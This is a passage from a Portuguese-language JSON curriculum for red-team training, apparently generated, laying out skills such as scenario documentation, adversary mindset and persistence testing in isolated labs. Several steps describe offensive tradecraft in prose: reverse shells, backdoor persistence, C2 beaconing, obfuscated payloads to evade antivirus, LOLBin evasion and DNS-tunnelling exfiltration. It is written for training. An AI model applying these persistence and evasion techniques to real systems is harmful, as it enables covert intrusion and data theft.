                              "realWorldApplication": "Em operações de red teaming e blue teaming, walkthroughs validam planos de ataque/defesa antes de execuções caras ou arriscadas, evitando falhas em incidentes reais como breaches em empresas ou simulações governamentais de ciberameaças."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.3.5",
                            "name": "Documentar cenários para reutilização",
                            "description": "Elaborar relatórios com diagramas, fluxogramas e scripts iniciais, facilitando montagem de ambientes e iterações futuras em jogos cibernéticos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Coletar Elementos Chave do Cenário",
                                  "subSteps": [
                                    "Liste todos os componentes do cenário: atores (atacante, defensor), ativos (redes, hosts), vulnerabilidades e táticas de ataque.",
                                    "Registre configurações de ambiente: topologia de rede, ferramentas usadas e estados iniciais.",
                                    "Documente sequências de eventos: timeline de ações, respostas e resultados observados.",
                                    "Capture screenshots ou logs relevantes durante a execução do cenário.",
                                    "Organize os dados em categorias lógicas (ex: infraestrutura, ameaças, mitigações)."
                                  ],
                                  "verification": "Verifique se há uma lista completa e categorizada de todos os elementos sem omissões, com timestamps e referências cruzadas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Ferramentas de anotações (Notion, OneNote), logs de simulação, screenshots de ferramentas como Wireshark ou Nmap.",
                                  "tips": "Use templates padronizados para coleta para agilizar o processo e garantir consistência.",
                                  "learningObjective": "Compreender e catalogar todos os aspectos de um cenário cibernético para reprodução fiel.",
                                  "commonMistakes": "Omitir detalhes sutis como versões de software ou configurações específicas de firewall."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar Diagramas e Fluxogramas Visuais",
                                  "subSteps": [
                                    "Desenhe a topologia de rede usando ferramentas como Draw.io ou Lucidchart.",
                                    "Crie fluxogramas para sequências de ataque e defesa, incluindo pontos de decisão.",
                                    "Inclua legendas claras para símbolos e anotações com dados coletados no Step 1.",
                                    "Valide os diagramas com stakeholders para precisão.",
                                    "Exporte em formatos editáveis (SVG/PDF) e imagens de alta resolução."
                                  ],
                                  "verification": "Confirme que diagramas são legíveis, precisos e reproduzem o cenário quando seguidos.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": "Draw.io, Lucidchart, Visio; referências visuais do cenário.",
                                  "tips": "Mantenha diagramas simples: use cores para diferenciar atores e setas para fluxo temporal.",
                                  "learningObjective": "Representar visualmente cenários complexos para facilitar compreensão e reutilização.",
                                  "commonMistakes": "Sobrecarregar diagramas com excesso de texto, tornando-os ilegíveis."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Scripts Iniciais para Montagem de Ambiente",
                                  "subSteps": [
                                    "Escreva scripts de setup em Bash/Python para recriar rede e hosts (ex: docker-compose para containers).",
                                    "Inclua instalação de ferramentas, configuração de vulnerabilidades e estados iniciais.",
                                    "Teste os scripts em um ambiente limpo para validar automação.",
                                    "Adicione comentários detalhados e variáveis parametrizáveis para customização.",
                                    "Versione os scripts em Git com tags para iterações futuras."
                                  ],
                                  "verification": "Execute o script e confirme que o ambiente é montado idêntico ao original em menos de 10 minutos.",
                                  "estimatedTime": "4-5 horas",
                                  "materials": "Editor de código (VS Code), Git, ambientes de teste (VirtualBox, Docker).",
                                  "tips": "Modularize scripts: um para rede, outro para apps, para facilitar manutenção.",
                                  "learningObjective": "Automatizar a recriação de ambientes cibernéticos para eficiência em jogos de guerra.",
                                  "commonMistakes": "Esquecer dependências externas ou hardcodar IPs/ports, quebrando portabilidade."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Compilar Relatório Estruturado e Preparar para Reutilização",
                                  "subSteps": [
                                    "Estruture o relatório: introdução, elementos coletados, diagramas, scripts, lições aprendidas.",
                                    "Inclua índice, glossário e instruções de uso/reprodução.",
                                    "Adicione seção de variações para iterações futuras (ex: escalar ataque).",
                                    "Revise por clareza, completude e formatação profissional.",
                                    "Publique em repositório compartilhável com acesso controlado."
                                  ],
                                  "verification": "Outra pessoa consegue reproduzir o cenário usando apenas o relatório em uma tentativa.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": "Ferramentas de edição (Google Docs, Markdown), repositórios (GitHub, GitLab).",
                                  "tips": "Use Markdown para relatórios versionáveis e convertíveis para PDF/HTML.",
                                  "learningObjective": "Produzir documentação reutilizável que suporte equipes em operações cibernéticas repetidas.",
                                  "commonMistakes": "Fazer relatório muito técnico sem contexto para não-especialistas."
                                }
                              ],
                              "practicalExample": "Em um jogo cibernético simulando um ataque de ransomware, documente: diagrama da rede vítima-atacante, fluxograma do exploit via RDP, script Docker para spin-up de Windows vuln + C2 server. Relatório permite recriar em 15min para treinamento de blue team.",
                              "finalVerifications": [
                                "Relatório reproduz cenário idêntico via scripts e diagramas.",
                                "Tempo de setup < 30min em ambiente novo.",
                                "Testado por peer review sem ambiguidades.",
                                "Inclui todos diagramas, scripts e logs anotados.",
                                "Versionado e acessível para iterações.",
                                "Glossário cobre termos técnicos."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos elementos do cenário cobertos (90%+).",
                                "Clareza visual: Diagramas legíveis e intuitivos.",
                                "Automação: Scripts funcionam sem intervenção manual.",
                                "Reutilização: Fácil adaptação para variações.",
                                "Profissionalismo: Estrutura lógica, sem erros gramaticais.",
                                "Eficiência: Tempo de reprodução otimizado."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Desenvolvimento de scripts automatizados.",
                                "Design Gráfico: Criação de diagramas e fluxogramas.",
                                "Redação Técnica: Elaboração de relatórios claros.",
                                "Gestão de Projetos: Versionamento e compartilhamento.",
                                "Análise de Dados: Interpretação de logs e métricas."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, equipes de SOC usam essa documentação para treinar respostas a incidentes recorrentes, auditorias de conformidade e simulações de pentest em empresas, reduzindo tempo de setup de dias para horas."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  }
                ]
              },
              {
                "id": "10.1.2",
                "name": "Mindset do Adversário e Organização do Red Team",
                "description": "Explora a mentalidade do atacante e a estrutura organizacional de equipes de Red Team para simulações ofensivas.",
                "totalSkills": 40,
                "atomicTopics": [
                  {
                    "id": "10.1.2.1",
                    "name": "Mindset do Adversário Cibernético",
                    "description": "Mentalidade e abordagens psicológicas do atacante em operações cibernéticas ofensivas.",
                    "individualConcepts": [
                      {
                        "id": "10.1.2.1.1",
                        "name": "Pensamento como Adversário",
                        "description": "Adotar a perspectiva mental do atacante cibernético para antecipar movimentos e explorar vulnerabilidades de forma proativa.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.1.1",
                            "name": "Simular cenários de ataque do ponto de vista inimigo",
                            "description": "Praticar a inversão de papéis para mapear fraquezas em sistemas como um adversário faria, identificando caminhos de exploração não convencionais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Analisar o Alvo e Seu Ambiente",
                                  "subSteps": [
                                    "Identifique o sistema alvo (ex: rede corporativa, app web).",
                                    "Mapeie ativos críticos: servidores, dados sensíveis, usuários.",
                                    "Pesquise arquitetura: topologia de rede, softwares usados, configurações públicas.",
                                    "Colete inteligência OSINT: domínios, IPs, funcionários via LinkedIn.",
                                    "Documente o escopo e regras de engajamento simuladas."
                                  ],
                                  "verification": "Checklist completo de ativos e inteligência coletada, revisado por pares.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas OSINT: Maltego, Shodan, theHarvester",
                                    "Documentos do alvo (diagramas, relatórios públicos)"
                                  ],
                                  "tips": "Comece amplo e refine; evite suposições iniciais.",
                                  "learningObjective": "Compreender o ecossistema do alvo como um atacante faria.",
                                  "commonMistakes": [
                                    "Ignorar fontes OSINT não técnicas",
                                    "Focar só em tech, ignorar humanos",
                                    "Violar escopo simulado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Adotar o Mindset do Adversário",
                                  "subSteps": [
                                    "Estude perfis de atacantes reais (ex: APT groups como Lazarus).",
                                    "Liste motivações: ganho financeiro, espionagem, caos.",
                                    "Inverta papéis: pergunte 'Como eu defenderia isso?' e negue.",
                                    "Brainstorm táticas não convencionais: social engineering, supply chain.",
                                    "Crie persona do atacante: recursos, paciência, criatividade."
                                  ],
                                  "verification": "Persona documentada com motivações e táticas iniciais aprovada.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "Relatórios de threat intelligence (MITRE ATT&CK)",
                                    "Casos de estudo de breaches (Verizon DBIR)"
                                  ],
                                  "tips": "Use role-playing verbal para internalizar o mindset.",
                                  "learningObjective": "Desenvolver empatia com o adversário para pensar criativamente.",
                                  "commonMistakes": [
                                    "Manter viés defensivo",
                                    "Limitar a ataques conhecidos",
                                    "Subestimar criatividade humana"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Mapear Fraquezas e Vetores de Exploração",
                                  "subSteps": [
                                    "Enumere vulnerabilidades potenciais: misconfigs, patches pendentes.",
                                    "Identifique caminhos não convencionais: third-parties, insiders.",
                                    "Modele kill chain: reconnaissance a exfiltração.",
                                    "Priorize por impacto e viabilidade (CVSS + criatividade).",
                                    "Desenhe fluxogramas de ataques possíveis."
                                  ],
                                  "verification": "Mapa de fraquezas com 5+ vetores priorizados e diagramas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Ferramentas: Nmap, Burp Suite (simulado)",
                                    "MITRE ATT&CK Navigator"
                                  ],
                                  "tips": "Pense em 'zero-day' comportamental, não só técnico.",
                                  "learningObjective": "Identificar fraquezas ocultas através de perspectiva adversária.",
                                  "commonMistakes": [
                                    "Focar só em CVEs conhecidas",
                                    "Ignorar chaining de fraquezas",
                                    "Sobrestimar defesas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular o Cenário de Ataque",
                                  "subSteps": [
                                    "Execute simulação passo a passo no ambiente controlado (lab).",
                                    "Registre ações, timestamps e decisões em tempo real.",
                                    "Adapte dinamicamente a respostas defensivas simuladas.",
                                    "Teste pivoting e escalação de privilégios.",
                                    "Simule exfiltração e persistência."
                                  ],
                                  "verification": "Log de simulação completa com sucesso em pelo menos um caminho.",
                                  "estimatedTime": "3-4 horas",
                                  "materials": [
                                    "Ambiente lab: VirtualBox/VMware com targets vulneráveis",
                                    "Ferramentas: Metasploit, custom scripts"
                                  ],
                                  "tips": "Grave screen para review; pause para refletir.",
                                  "learningObjective": "Executar simulação realista revelando exploits viáveis.",
                                  "commonMistakes": [
                                    "Seguir scripts rígidos",
                                    "Não simular detecção",
                                    "Parar no primeiro sucesso"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Analisar Resultados e Documentar Lições",
                                  "subSteps": [
                                    "Revise logs: o que funcionou, falhou e por quê.",
                                    "Mapeie defesas que pararam o ataque.",
                                    "Gere relatório: caminhos explorados, recomendações defensivas.",
                                    "Discuta em debrief: mindset shifts observados.",
                                    "Atualize modelo de ameaça com novas insights."
                                  ],
                                  "verification": "Relatório final com achados e recomendações peer-reviewed.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Templates de relatório Red Team",
                                    "Ferramentas de diagramação: Draw.io"
                                  ],
                                  "tips": "Quantifique riscos (ex: tempo para breach).",
                                  "learningObjective": "Extrair valor acionável da simulação para defesa.",
                                  "commonMistakes": [
                                    "Relatório superficial",
                                    "Ignorar falhas como lições",
                                    "Não conectar a mindset"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab simulando uma empresa fintech, adote mindset de insider malicioso: use OSINT para achar vendor fraco, phishing simulado para foothold, pivote para banco de dados via SQLi não convencional, exfiltre dados via DNS tunneling.",
                              "finalVerifications": [
                                "Pode listar 5+ fraquezas não óbvias em um sistema dado.",
                                "Simula ataque completo em lab com log detalhado.",
                                "Inverte papéis fluidamente em discussões de grupo.",
                                "Gera relatório com recomendações defensivas priorizadas.",
                                "Identifica caminhos de ataque em cenários reais de breaches.",
                                "Adapta simulação a defesas dinâmicas sem pânico."
                              ],
                              "assessmentCriteria": [
                                "Profundidade do mindset adversário (criatividade em vetores).",
                                "Completude do mapeamento de fraquezas (cobertura abrangente).",
                                "Precisão e realismo da simulação (logs auditáveis).",
                                "Qualidade do relatório (acionável, quantificado).",
                                "Habilidade de debrief (insights interdisciplinares).",
                                "Tempo e eficiência na execução."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Teoria da Perspectiva e Empatia Cognitiva.",
                                "Estratégia Militar: Sun Tzu 'Conheça o inimigo'.",
                                "Engenharia de Software: Threat Modeling (STRIDE).",
                                "Gestão de Riscos: Análise de Cenários Adversários.",
                                "Inteligência Artificial: Simulações de Jogos Adversários (GANs)."
                              ],
                              "realWorldApplication": "Red Teams em pentests usam isso para descobrir brechas reais, como no breach da SolarWinds, onde simulações de supply chain attack revelaram fraquezas antes de exploração maliciosa, fortalecendo defesas proativas em orgs como bancos e governos."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.2",
                            "name": "Identificar motivações psicológicas do atacante",
                            "description": "Analisar drivers como ganância, ideologia ou curiosidade que impulsionam atacantes, aplicando isso para prever táticas em operações ofensivas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Estudar Tipos Comuns de Motivações Psicológicas em Ataques Cibernéticos",
                                  "subSteps": [
                                    "Pesquise e liste as principais categorias de motivações: ganância financeira, ideologia política/religiosa, curiosidade/hacking recreativo, vingança pessoal, espionagem estatal e busca por reconhecimento.",
                                    "Leia artigos ou relatórios sobre perfis de atacantes (ex: MITRE ATT&CK, relatórios da Mandiant).",
                                    "Crie um mapa mental conectando cada motivação a comportamentos típicos, como persistência em ataques financeiros vs. ataques rápidos ideológicos.",
                                    "Assista a vídeos ou palestras TED sobre psicologia criminal aplicada a cibersegurança.",
                                    "Anote exemplos reais para cada tipo de motivação."
                                  ],
                                  "verification": "Mapa mental completo com pelo menos 6 motivações e 3 exemplos cada, revisado por um par ou autoavaliação.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramenta de mind mapping (ex: MindMeister, XMind)",
                                    "Relatórios MITRE ATT&CK e Mandiant"
                                  ],
                                  "tips": "Comece com motivações mais comuns como ganância para construir confiança antes de casos complexos.",
                                  "learningObjective": "Compreender e categorizar as motivações psicológicas fundamentais que impulsionam atacantes cibernéticos.",
                                  "commonMistakes": [
                                    "Confundir motivação com método técnico (foco em 'porquê', não 'como')",
                                    "Ignorar contextos culturais que influenciam ideologias",
                                    "Listar apenas exemplos genéricos sem fontes reais"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Casos Históricos de Ataques Cibernéticos",
                                  "subSteps": [
                                    "Selecione 3-5 casos famosos: WannaCry (ganância), SolarWinds (espionagem estatal), Anonymous (ideologia), NotPetya (vingança geopolítica).",
                                    "Para cada caso, identifique evidências da motivação principal através de timelines, manifestos e impactos.",
                                    "Compare padrões: como a ganância leva a ransomwares persistentes vs. ideologia em defacements rápidos.",
                                    "Entreviste ou leia opiniões de especialistas em fóruns como Krebs on Security.",
                                    "Documente em uma tabela: Motivação | Evidências | Táticas Previsíveis."
                                  ],
                                  "verification": "Tabela de análise com 5 casos, incluindo fontes citadas e padrões identificados.",
                                  "estimatedTime": "6 horas",
                                  "materials": [
                                    "Relatórios de incidentes (ex: CrowdStrike, FireEye)",
                                    "Ferramenta de tabela (Google Sheets, Excel)",
                                    "Vídeos de análise de casos no YouTube"
                                  ],
                                  "tips": "Use fontes primárias como comunicados dos atacantes para evitar vieses midiáticos.",
                                  "learningObjective": "Aplicar teoria de motivações a incidentes reais para reconhecer padrões comportamentais.",
                                  "commonMistakes": [
                                    "Atribuir motivações sem evidências concretas",
                                    "Focar apenas em ataques bem-sucedidos, ignorando falhas reveladoras",
                                    "Generalizar um caso para todos os atacantes"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Praticar Análise em Cenários Hipotéticos",
                                  "subSteps": [
                                    "Crie ou baixe 4 cenários fictícios descrevendo um ataque parcial (ex: insider leak por vingança).",
                                    "Para cada um, infira a motivação principal e secundária com base em indícios como escolha de alvos e mensagens deixadas.",
                                    "Preveja 3 táticas prováveis baseadas na motivação (ex: curiosidade leva a exploração lateral).",
                                    "Discuta com um colega ou em um fórum para validar inferências.",
                                    "Registre acertos/erros em um diário de prática."
                                  ],
                                  "verification": "Relatório de 4 cenários analisados com previsões e feedback incorporado.",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "Cenários de CTF ou simuladores como TryHackMe",
                                    "Fórum Discord/Reddit de cibersegurança",
                                    "Notebook para diário"
                                  ],
                                  "tips": "Varie cenários para cobrir todas as motivações e evite padrões repetitivos.",
                                  "learningObjective": "Desenvolver habilidade de inferir motivações de evidências limitadas em tempo real.",
                                  "commonMistakes": [
                                    "Pressupor motivação financeira em todos os casos",
                                    "Ignorar motivações mistas (ex: ganância + ideologia)",
                                    "Fazer previsões vagas sem ligação direta à motivação"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Simular Previsão de Táticas em Operação Ofensiva",
                                  "subSteps": [
                                    "Planeje uma simulação de Red Team: defina um alvo fictício e atribua motivações a um 'adversário'.",
                                    "Baseado na motivação, liste táticas, técnicas e procedimentos (TTPs) prováveis usando frameworks como Diamond Model.",
                                    "Execute uma mini-simulação (ex: em lab virtual) ajustando táticas conforme motivação.",
                                    "Avalie se as previsões foram precisas e refine o modelo mental.",
                                    "Apresente findings em um relatório curto."
                                  ],
                                  "verification": "Relatório de simulação com TTPs previstos vs. executados e lições aprendidas.",
                                  "estimatedTime": "7 horas",
                                  "materials": [
                                    "Ambiente de lab virtual (Kali Linux, VulnHub)",
                                    "Framework MITRE ATT&CK Navigator",
                                    "Ferramenta de apresentação (PowerPoint)"
                                  ],
                                  "tips": "Integre ferramentas de threat hunting para validar previsões dinamicamente.",
                                  "learningObjective": "Integrar identificação de motivações à previsão de táticas em cenários operacionais.",
                                  "commonMistakes": [
                                    "Desconectar motivação de TTPs específicas",
                                    "Sobrecarregar simulação com muitas variáveis",
                                    "Não iterar baseado em resultados da simulação"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de Red Team, identifique que um 'atacante' deixa manifestos ideológicos em servidores comprometidos (motivação: ideologia). Preveja táticas como defacements públicos e ataques DDoS em massa, em vez de exfiltração discreta, ajustando defesas para mitigar visibilidade em vez de stealth.",
                              "finalVerifications": [
                                "Corretamente categorizar 90% das motivações em 10 cenários mistos.",
                                "Prever TTPs alinhadas à motivação em simulações com acurácia >80%.",
                                "Explicar evidências de motivação em casos reais sem hesitação.",
                                "Identificar motivações mistas em cenários complexos.",
                                "Aplicar insights para ajustar estratégias de defesa ofensiva.",
                                "Mapear motivações a perfis de grupos APT conhecidos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de motivações primárias/secundárias (peso: 30%).",
                                "Qualidade das evidências citadas e ligações causais (peso: 25%).",
                                "Relevância e especificidade das TTPs previstas (peso: 20%).",
                                "Profundidade da análise em subpassos e reflexões (peso: 15%).",
                                "Criatividade em conexões interdisciplinares (peso: 10%)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Teoria da Motivação de Maslow aplicada a criminosos cibernéticos.",
                                "Criminologia: Perfis de hackers vs. criminosos tradicionais (ex: modelo de Holt e Bossler).",
                                "Inteligência: Análise de mindset adversário em HUMINT/SIGINT.",
                                "Negócios: Impacto de motivações em riscos corporativos (ex: insider threats).",
                                "Sociologia: Influência de comunidades online em motivações coletivas."
                              ],
                              "realWorldApplication": "Em operações de Red Team ou CTI, use essa habilidade para antecipar movimentos de adversários reais, como prever ransomwares persistentes de grupos movidos por ganância (ex: Conti), otimizando defesas proativas e reduzindo tempo de dwell em breaches."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.2.1.1.3",
                            "name": "Aplicar empatia tática ao red teaming",
                            "description": "Desenvolver empatia com o mindset do adversário para criar estratégias de engajamento realistas em jogos de guerra cibernética.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e Mapear o Perfil do Adversário",
                                  "subSteps": [
                                    "Identificar o background histórico do adversário (ex.: grupos APT como APT28)",
                                    "Analisar motivações, objetivos e restrições (recursos, regras de engajamento)",
                                    "Coletar dados sobre táticas, técnicas e procedimentos (TTPs) conhecidos via relatórios OSINT",
                                    "Criar um perfil psicológico: impulsos, medos e padrões de decisão",
                                    "Documentar em um canvas de empatia com seções para 'pensar', 'sentir' e 'fazer'"
                                  ],
                                  "verification": "Perfil completo do adversário documentado e revisado por pares",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Relatórios MITRE ATT&CK",
                                    "Ferramentas OSINT como Maltego",
                                    "Canvas de Empatia template"
                                  ],
                                  "tips": "Use fontes múltiplas para evitar viés; foque em fatos verificáveis",
                                  "learningObjective": "Construir uma visão factual e multifacetada do adversário cibernético",
                                  "commonMistakes": [
                                    "Assumir conhecimento prévio sem pesquisa",
                                    "Ignorar contexto cultural/geopolítico",
                                    "Focar apenas em táticas técnicas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Imersão no Mindset do Adversário via Role-Playing",
                                  "subSteps": [
                                    "Adotar a persona do adversário: vestir-se, ambientar o espaço de trabalho",
                                    "Simular sessões de planejamento como o adversário: 'O que eu faria primeiro?'",
                                    "Registrar pensamentos internos em um diário de role-play por 1 hora",
                                    "Debater com um parceiro atuando como 'defesa' para testar perspectivas",
                                    "Refletir sobre desvios emocionais e ajustá-los para neutralidade tática"
                                  ],
                                  "verification": "Diário de role-play preenchido com pelo menos 10 entradas detalhadas",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Espaço isolado para imersão",
                                    "Timer para sessões",
                                    "Parceiro para debate",
                                    "Template de diário"
                                  ],
                                  "tips": "Evite julgamento moral; foque em lógica tática do adversário",
                                  "learningObjective": "Internalizar o raciocínio decisório do adversário para empatia autêntica",
                                  "commonMistakes": [
                                    "Misturar mindset próprio com o do adversário",
                                    "Role-play superficial sem imersão emocional",
                                    "Ignorar limitações reais do adversário"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Vulnerabilidades sob Perspectiva Adversária",
                                  "subSteps": [
                                    "Listar ativos defensivos e mapear fraquezas prováveis do ponto de vista do atacante",
                                    "Priorizar alvos baseado em valor para o adversário (CNA, espionagem, etc.)",
                                    "Simular cadeia de ataque: reconnaissance a exfiltração",
                                    "Identificar oportunidades de pivô e escalada que a defesa ignora",
                                    "Validar com ferramentas de modelagem como Attack Trees"
                                  ],
                                  "verification": "Mapa de vulnerabilidades com 5+ caminhos de ataque documentados",
                                  "estimatedTime": "5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator",
                                    "Ferramentas como Caldera para simulação",
                                    "Attack Tree software"
                                  ],
                                  "tips": "Pergunte sempre: 'Isso faz sentido para o adversário?'",
                                  "learningObjective": "Detectar brechas invisíveis à defesa através da lente do atacante",
                                  "commonMistakes": [
                                    "Focar em vulnerabilidades técnicas sem contexto motivacional",
                                    "Subestimar defesas não técnicas como OPSEC",
                                    "Criar ataques irrealistas"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver e Refinar Estratégias de Engajamento",
                                  "subSteps": [
                                    "Gerar 3-5 estratégias de red team baseadas na empatia tática",
                                    "Simular execução em ambiente controlado (CTF ou lab virtual)",
                                    "Avaliar eficácia e iterar com feedback do role-play",
                                    "Documentar lições aprendidas e adaptações necessárias",
                                    "Apresentar plano final com métricas de sucesso"
                                  ],
                                  "verification": "Plano de engajamento com simulação bem-sucedida e relatório",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Labs virtuais como TryHackMe",
                                    "Ferramentas de simulação red team (Cobalt Strike trial)",
                                    "Template de plano de engajamento"
                                  ],
                                  "tips": "Mantenha estratégias realistas e escaláveis",
                                  "learningObjective": "Traduzir empatia em planos acionáveis e testáveis",
                                  "commonMistakes": [
                                    "Estratégias genéricas sem empatia específica",
                                    "Não testar em simulação",
                                    "Ignorar detecção pós-engajamento"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um jogo de guerra cibernética simulando um APT chinês contra uma empresa de defesa, adote o mindset do grupo: priorize espionagem sigilosa sobre destruição. Use empatia tática para infiltrar via supply chain (fornecedor comprometido), pivote para rede interna e exfiltre dados sensíveis sem alertas, testando defesas reais da blue team.",
                              "finalVerifications": [
                                "Pode descrever com precisão o mindset e TTPs de um adversário específico",
                                "Gera estratégias de ataque que surpreendem a defesa em simulações",
                                "Identifica vulnerabilidades ocultas não óbvias para analistas tradicionais",
                                "Documenta empatia tática em relatórios claros e acionáveis",
                                "Adapta planos dinamicamente baseado em respostas defensivas",
                                "Demonstra neutralidade emocional no role-playing"
                              ],
                              "assessmentCriteria": [
                                "Profundidade e precisão do perfil do adversário (80%+ cobertura de TTPs)",
                                "Autenticidade da imersão no mindset (avaliado por observador)",
                                "Criatividade e realismo das estratégias geradas",
                                "Taxa de sucesso em simulações (70%+ bypass de defesas)",
                                "Qualidade da documentação e lições aprendidas",
                                "Capacidade de conectar empatia a impactos táticos mensuráveis"
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Modelos de empatia cognitiva e role-taking",
                                "Inteligência Militar: Análise de OODA Loop do adversário",
                                "Negociação e Diplomacia: Entender motivações geopolíticas",
                                "Design de Jogos: Simulações imersivas para treinamento",
                                "Antropologia Cultural: Contextos que moldam mindsets adversários"
                              ],
                              "realWorldApplication": "Em operações de red teaming para governos ou empresas, essa empatia tática permite simular ataques APT realistas, como os vistos em campanhas SolarWinds ou Colonial Pipeline, melhorando a resiliência cibernética ao expor fraquezas antes de explorações reais."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.2.1.1.1"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "10.1.2.1.2",
                        "name": "Persistência e Paciência Estratégica",
                        "description": "Cultivar a resiliência mental necessária para operações prolongadas, imitando a tenacidade dos atacantes cibernéticos em cenários de persistência.",
                        "specificSkills": [
                          {
                            "id": "10.1.2.1.2.1",
                            "name": "Executar testes de persistência em ambientes simulados",
                            "description": "Manter acessos em sistemas por períodos estendidos, testando técnicas de pivoting e evasão de detecção com paciência iterativa.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente de simulação isolado",
                                  "subSteps": [
                                    "Criar VMs isoladas representando alvos (ex: Windows Server, Linux hosts) usando VirtualBox ou VMware.",
                                    "Configurar rede interna simulada com firewall, EDR básico (ex: Sysmon, OSSEC) e logs de monitoramento.",
                                    "Instalar ferramentas de ataque em máquina atacante (ex: Kali Linux com Metasploit, PowerShell Empire).",
                                    "Definir cenário: acesso inicial via phishing simulado ou exploit conhecido.",
                                    "Testar conectividade e baseline de detecção antes de iniciar."
                                  ],
                                  "verification": "Ambiente rodando sem vazamentos para rede externa; logs baseline coletados e analisados.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": "VirtualBox/VMware, imagens de VMs (Windows/Linux), Kali Linux ISO, ferramentas EDR gratuitas (Sysmon).",
                                  "tips": "Use snapshots de VM para reset rápido entre testes.",
                                  "learningObjective": "Entender configuração de labs seguros para simular cenários reais sem riscos.",
                                  "commonMistakes": "Expor lab à internet real; ignorar configuração de logs no alvo."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Estabelecer persistência inicial no alvo",
                                  "subSteps": [
                                    "Explorar acesso inicial com payload (ex: Meterpreter reverse shell via msfvenom).",
                                    "Implantar backdoor persistente (ex: serviço Windows, cron job Linux).",
                                    "Configurar C2 (Command & Control) com beaconing intervalos longos (ex: 5-10 min).",
                                    "Verificar estabilidade: reiniciar alvo e confirmar reconexão automática.",
                                    "Documentar artefatos criados (registros, arquivos)."
                                  ],
                                  "verification": "Shell reconecta após reboot do alvo; nenhum alerta imediato em logs.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": "Metasploit Framework, msfvenom, scripts de persistência (Empire stagers).",
                                  "tips": "Use payloads ofuscados para reduzir assinaturas AV.",
                                  "learningObjective": "Dominar técnicas básicas de persistência para manutenção de acesso.",
                                  "commonMistakes": "Beaconing muito frequente causando tráfego suspeito; não testar pós-reboot."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar pivoting e evasão de detecção",
                                  "subSteps": [
                                    "Pivotar para host secundário via SOCKS proxy ou tunelamento (ex: Metasploit autoroute).",
                                    "Aplicar evasão: living-off-the-land (LOLBins como certutil), ofuscação de comandos.",
                                    "Ajustar timings: sleeps randômicos, user-agent rotation em C2.",
                                    "Simular detecções: revisar logs periodicamente e adaptar (ex: kill processos suspeitos).",
                                    "Expandir persistência no pivô: repetir backdoor com variações."
                                  ],
                                  "verification": "Acesso pivotado mantido; tráfego não flagged em ferramentas de monitoramento.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Metasploit pivoting modules, PowerShell obfuscators, Wireshark para tráfego.",
                                  "tips": "Monitore CPU/disco no alvo para evitar picos que triggerem alertas.",
                                  "learningObjective": "Aprender pivoting stealth e táticas de evasão iterativa.",
                                  "commonMistakes": "Pivoting ruidoso sem proxy; comandos não ofuscados detectados por EDR."
                                },
                                {
                                  "stepNumber": 4,
